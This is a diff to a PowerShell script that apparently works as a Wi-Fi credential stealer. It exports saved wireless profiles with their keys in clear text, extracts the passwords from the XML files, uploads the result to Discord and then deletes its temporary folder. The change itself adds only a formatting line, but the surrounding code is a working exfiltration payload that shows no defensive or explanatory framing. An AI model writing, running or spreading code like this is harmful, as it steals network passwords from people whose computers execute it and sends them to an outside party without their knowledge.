@@ -54,6 +54,7 @@ Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=c
 $originalOutput = Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} 
 $touchedOutput = $originalOutput.Replace("C:\Users\$env:username\AppData\Local\Temp\js2k3kd4nne5dhsk\Wi-Fi-", "")
 $loggedwifis = $touchedOutput -replace "\.xml:.*?\:"
+$test = $loggedwifis | Format-Table | Out-String
 Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"
 Set-Location -Path "$env:temp"
 Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse
